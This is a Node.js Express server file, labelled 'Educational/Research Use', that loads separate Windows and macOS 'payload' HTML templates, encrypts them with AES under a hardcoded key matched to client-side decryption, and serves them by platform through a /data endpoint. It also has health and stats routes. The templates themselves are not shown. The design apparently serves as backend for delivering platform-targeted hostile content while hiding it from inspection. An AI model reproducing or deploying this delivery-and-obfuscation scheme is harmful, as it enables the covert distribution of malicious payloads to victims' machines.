// index.js — Backend API Server (Educational/Research Use)
const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const CryptoJS = require('crypto-js');

const app = express();
const PORT = process.env.PORT || 3000;

// Enable CORS for cross-origin frontend access
app.use(cors());
app.use(express.json());

// Load HTML payload templates from separate files
let winHtml, macHtml;

try {
    winHtml = fs.readFileSync(path.join(__dirname, 'payload-win.html'), 'utf8');
    console.log('[✓] Loaded payload-win.html');
} catch (err) {
    console.error('[✗] Failed to load payload-win.html:', err.message);
    winHtml = '<h1>Windows Payload Placeholder</h1><p>Error loading template.</p>';
}

try {
    macHtml = fs.readFileSync(path.join(__dirname, 'payload-mac.html'), 'utf8');
    console.log('[✓] Loaded payload-mac.html');
} catch (err) {
    console.error('[✗] Failed to load payload-mac.html:', err.message);
    macHtml = '<h1>macOS Payload Placeholder</h1><p>Error loading template.</p>';
}

// Encryption key matching the client-side decryption logic
const PAYLOAD_ENCRYPTION_KEY = '98yNCjeAfWMwk0wI';

// Request logging middleware (for debugging)
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
    next();
});

// API endpoint returning encrypted payload
app.get('/data', (req, res) => {
    const platform = req.query.platform || 'win';
    
    let rawHtml = (platform === 'mac') ? macHtml : winHtml;
    console.log(`[ℹ] Serving ${platform === 'mac' ? 'macOS' : 'Windows'} payload`);

    try {
        const ciphertext = CryptoJS.AES.encrypt(rawHtml, PAYLOAD_ENCRYPTION_KEY).toString();
        
        // Add timing header for performance monitoring
        res.setHeader('X-Encryption-Time', Date.now());
        res.json({ cipher: ciphertext });
    } catch (err) {
        console.error('[✗] Encryption error:', err.message);
        res.status(500).json({ error: 'Encryption failed', details: err.message });
    }
});

// Health check endpoint (for readiness probes)
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        uptime: process.uptime(), 
        timestamp: new Date().toISOString(),
        platform: process.platform,
        nodeVersion: process.version
    });
});

// Stats endpoint (monitoring)
app.get('/stats', (req, res) => {
    res.json({
        uptime: process.uptime(),
        memoryUsage: process.memoryUsage(),
        pid: process.pid
    });
});

// Bind to 0.0.0.0 for container accessibility (fixes readiness probe)
app.listen(PORT, '0.0.0.0', () => {
    console.log(`[✓] Backend API server running on http://0.0.0.0:${PORT}`);
    console.log(`[ℹ] Endpoints:`);
    console.log(`    - GET /data?platform=win|mac`);
    console.log(`    - GET /health (readiness probe)`);
    console.log(`    - GET /stats (monitoring)`);
    console.log(`[ℹ] Process PID: ${process.pid}`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('[ℹ] SIGTERM received, shutting down gracefully...');
    process.exit(0);
});

process.on('uncaughtException', (err) => {
    console.error('[✗] Uncaught exception:', err);
    process.exit(1);
});
